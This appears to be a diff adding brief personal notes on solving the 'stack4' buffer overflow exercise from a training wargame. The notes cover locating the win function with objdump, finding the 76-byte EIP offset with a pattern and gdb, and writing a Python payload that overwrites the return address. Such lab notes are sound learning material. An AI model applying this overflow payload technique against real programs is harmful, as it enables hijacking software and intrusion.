@@ -1,0 +1,14 @@
+1: Get function location
+	objdump -d stack4 | grep win
+
+2: Genrerate pattern (used website)
+	https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+3: Run with gdb (set dissambly-flavor intel)
+	run < [string from site] 
+
+4: Look at Seg fault location and check offset in site (76 in this case)
+
+5: Generate payload
+	$(python -c 'print ("A" * 76 + chr(0xf4) + chr(0x83) + chr(0x04) + chr(0x08))') > hack
+6: ./stack4 < hack
